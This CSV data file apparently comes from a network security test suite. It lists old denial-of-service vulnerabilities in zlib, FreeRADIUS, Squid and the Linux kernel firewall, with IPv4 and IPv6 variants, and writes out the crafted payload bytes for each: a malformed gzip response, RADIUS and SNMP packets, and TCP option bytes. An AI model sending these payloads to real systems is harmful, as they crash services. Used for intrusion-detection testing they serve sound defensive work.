XmlName,ExecDesc,EngDesc,Protocol,SPECProtocol,Payload
﻿FSC20040830-01_zlib_Denial_of_Service.xml,zlib Denial of Service,"A vulnerability exists in the inflate() and inflateback() functions of the zlib library. This vulnerability is caused by insufficient error handling during the pattern expansion of compressed data. An attacker can leverage this vulnerability to create a denial of service condition, or with a high level of sophistication, possibly execute an arbitrary code.",HTTP-ALT,TCP,"GET / HTTP/1.1[[0D 0A ]]Host: 10.2.1.161:8080[[0D 0A ]]User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.4.1) Gecko/20031114[[0D 0A ]]Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,video/x-mng,image/png,image/jpeg,image/gif;q=0.2,*/*;q=0.1[[0D 0A ]]Accept-Language: en-us,en;q=0.5[[0D 0A ]]Accept-Encoding: gzip,deflate[[0D 0A ]]Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7[[0D 0A ]]Keep-Alive: 300[[0D 0A ]]Connection: keep-alive[[0D 0A 0D 0A]]"
FSC20040830-01_zlib_Denial_of_Service.xml,zlib Denial of Service,"A vulnerability exists in the inflate() and inflateback() functions of the zlib library. This vulnerability is caused by insufficient error handling during the pattern expansion of compressed data. An attacker can leverage this vulnerability to create a denial of service condition, or with a high level of sophistication, possibly execute an arbitrary code.",HTTP-ALT,TCP,HTTP/1.0 200 OK[[0D 0A ]]Content-Type: text/plain[[0D 0A ]]Content-Encoding: gzip[[0D 0A ]]Content-Length: 59[[0D 0A 0D 0A ]]x[[9C 85 C1 B9 11 80 ]]0[[10 04 ]]A[[EC A9 9A A0 C4 ]]+[[1E 91 ]][[FE D8 EB ]]p[[DD AD FD 93 B9 ]] KA[[D6 82 ]]l[[05 D9 0B ]]r[[14 A4 ]]'9[[93 ]]\I[[EE ]]$O[[92 91 E4 ]]M2}yw[[[86]]
﻿FSC20040830-01_zlib_Denial_of_Service_IPv6.xml,zlib Denial of Service (IPv6 Version),"A vulnerability exists in the inflate() and inflateback() functions of the zlib library. This vulnerability is caused by insufficient error handling during the pattern expansion of compressed data. An attacker can leverage this vulnerability to create a denial of service condition, or with a high level of sophistication, possibly execute an arbitrary code. (IPv6 Version)",HTTP-ALT/IPv6,TCP,"GET / HTTP/1.1[[0D 0A ]]Host: 10.2.1.161:8080[[0D 0A ]]User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.4.1) Gecko/20031114[[0D 0A ]]Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,video/x-mng,image/png,image/jpeg,image/gif;q=0.2,*/*;q=0.1[[0D 0A ]]Accept-Language: en-us,en;q=0.5[[0D 0A ]]Accept-Encoding: gzip,deflate[[0D 0A ]]Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7[[0D 0A ]]Keep-Alive: 300[[0D 0A ]]Connection: keep-alive[[0D 0A 0D 0A]]"
FSC20040830-01_zlib_Denial_of_Service_IPv6.xml,zlib Denial of Service (IPv6 Version),"A vulnerability exists in the inflate() and inflateback() functions of the zlib library. This vulnerability is caused by insufficient error handling during the pattern expansion of compressed data. An attacker can leverage this vulnerability to create a denial of service condition, or with a high level of sophistication, possibly execute an arbitrary code. (IPv6 Version)",HTTP-ALT/IPv6,TCP,HTTP/1.0 200 OK[[0D 0A ]]Content-Type: text/plain[[0D 0A ]]Content-Encoding: gzip[[0D 0A ]]Content-Length: 59[[0D 0A 0D 0A ]]x[[9C 85 C1 B9 11 80 ]]0[[10 04 ]]A[[EC A9 9A A0 C4 ]]+[[1E 91 ]][[FE D8 EB ]]p[[DD AD FD 93 B9 ]] KA[[D6 82 ]]l[[05 D9 0B ]]r[[14 A4 ]]'9[[93 ]]\I[[EE ]]$O[[92 91 E4 ]]M2}yw[[[86]]
﻿FSC20040920-01_FreeRADIUS_Unspecified_Denial_of_Service.xml,FreeRADIUS Unspecified Denial of Service,"A vulnerability exists in the way the FreeRADIUS software package handles out of sequence messages. When a RADIUS authentication or accounting request is sent out-of-order to a vulnerable FreeRADIUS, a memory exception occurs. This vulnerability may be leveraged by a remote attacker to deny service to the FreeRADIUS server.",RADIUS,UDP,[[01 00 00 16 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 D7 02]]
﻿FSC20040920-01_FreeRADIUS_Unspecified_Denial_of_Service_IPv6.xml,FreeRADIUS Unspecified Denial of Service (IPv6 Version),"A vulnerability exists in the way the FreeRADIUS software package handles out of sequence messages. When a RADIUS authentication or accounting request is sent out-of-order to a vulnerable FreeRADIUS, a memory exception occurs. This vulnerability may be leveraged by a remote attacker to deny service to the FreeRADIUS server. (IPv6 Version)",RADIUS/IPv6,UDP,[[01 00 00 16 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 D7 02]]
﻿FSC20041028-01_Squid_ASN_1_Header_Parsing_Denial_of_Service.xml,Squid ASN.1 Header Parsing Denial of Service,"There is a vulnerability in the way Squid web proxy parses SNMP messages. An SNMP message with specially crafted ASN.1 length fields can generate memory access violation errors. The exception generated by these errors can cause the product to restart, creating a denial of service condition for active transactions.",FILECAST,UDP,00[[02 01 00 04 06 ]]public[[A0 ]]#[[02 04 ]]G[[EB C5 ]]6[[02 01 00 02 01 00 ]]0[[15 ]]0[[84 FF FF FF FF 06 0B ]]+[[06 01 04 01 9B ]]'[[01 02 02 00 04 00]]
﻿FSC20041028-01_Squid_ASN_1_Header_Parsing_Denial_of_Service_IPv6.xml,Squid ASN.1 Header Parsing Denial of Service (IPv6 Version),"There is a vulnerability in the way Squid web proxy parses SNMP messages. An SNMP message with specially crafted ASN.1 length fields can generate memory access violation errors. The exception generated by these errors can cause the product to restart, creating a denial of service condition for active transactions. (IPv6 Version)",FILECAST/IPv6,UDP,00[[02 01 00 04 06 ]]public[[A0 ]]#[[02 04 ]]G[[EB C5 ]]6[[02 01 00 02 01 00 ]]0[[15 ]]0[[84 FF FF FF FF 06 0B ]]+[[06 01 04 01 9B ]]'[[01 02 02 00 04 00]]
﻿FSC20041029-01_Linux_Kernel_Firewall_Logging_Denial_of_Service.xml,Linux Kernel Firewall Logging Denial of Service,"A vulnerability exists in the way the Linux kernel 2.6 firewall logs TCP packets. The vulnerability results from improper validation of the TCP header when a TCP segment matches a firewall rule. This vulnerability can allow a remote attacker to cause complete kernel failure on the target system by sending a specially crafted, and possibly spoofed, TCP packet.",BRE,TCP,[[02 ]][[FE 00 00 00 00]]
﻿FSC20041029-01_Linux_Kernel_Firewall_Logging_Denial_of_Service_IPv6.xml,Linux Kernel Firewall Logging Denial of Service (IPv6 Version),"A vulnerability exists in the way the Linux kernel 2.6 firewall logs TCP packets. The vulnerability results from improper validation of the TCP header when a TCP segment matches a firewall rule. This vulnerability can allow a remote attacker to cause complete kernel failure on the target system by sending a specially crafted, and possibly spoofed, TCP packet. (IPv6 Version)",BRE/IPv6,TCP,[[02 ]][[FE 00 00 00 00]]
